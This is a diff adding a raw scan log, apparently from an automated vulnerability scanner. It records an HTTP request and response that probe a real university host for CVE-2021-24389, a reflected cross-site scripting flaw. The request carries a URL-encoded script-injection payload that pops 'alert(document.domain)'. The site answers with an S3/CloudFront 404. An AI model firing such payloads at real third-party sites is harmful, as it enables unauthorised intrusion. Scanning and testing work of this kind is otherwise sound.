@@ -1,0 +1,47 @@
+[CVE-2021-24389] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/listings/?search_title&location&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+
+GET /listings/?search_title&location&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2021-24389] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/listings/?search_title&location&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 536
+Age: 2
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:59 GMT
+Server: AmazonS3
+Via: 1.1 b30e8d5c8b76c102ed260379b18e1d52.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 2rQijWHZAc0uyiQg2q5Q-i5dGuFMVNadlDZHtyJYDPDrpKfTGEwmFw==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<h1>404 Not Found</h1>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: 404.html</li>
+<li>RequestId: 2MP3SAEWT8QB0KK7</li>
+<li>HostId: YxdRLMd/aAVzUvW3shK65D57rdzxEKPJyx3UiJWW9mc17qEQteQvpJ6wrPjHiydr3UhSQnSn7/Q=</li>
+</ul>
+<h3>An Error Occurred While Attempting to Retrieve a Custom Error Document</h3>
+<ul>
+<li>Code: NoSuchKey</li>
+<li>Message: The specified key does not exist.</li>
+<li>Key: error.html</li>
+</ul>
+<hr/>
+</body>
+</html>
+
